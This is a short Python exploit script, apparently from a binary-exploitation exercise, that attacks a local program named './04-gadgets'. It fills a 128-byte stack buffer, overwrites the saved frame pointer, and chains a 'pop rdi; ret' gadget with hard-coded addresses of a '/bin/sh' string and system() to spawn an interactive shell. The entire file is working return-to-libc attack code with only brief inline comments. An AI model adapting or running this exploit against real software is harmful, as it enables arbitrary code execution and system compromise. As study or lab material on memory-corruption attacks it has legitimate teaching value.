#!/usr/bin/python

import struct

from zio import *

# 0x7ffff7a5b640 system
# 0x7ffff7b91cdb /bin/sh
# 0x00000000004005d3 pop rdi; ret

payload = 'a' * 128                          # buffer
payload += 'b' * 8                           # old rbp
payload += struct.pack('<Q', 0x4005d3)       # "pop rdi; ret" addr
payload += struct.pack('<Q', 0x7ffff7b91cdb) # "/bin/sh" addr
payload += struct.pack('<Q', 0x7ffff7a5b640) # system addr

io = zio("./04-gadgets")
io.write(payload)
io.interact()
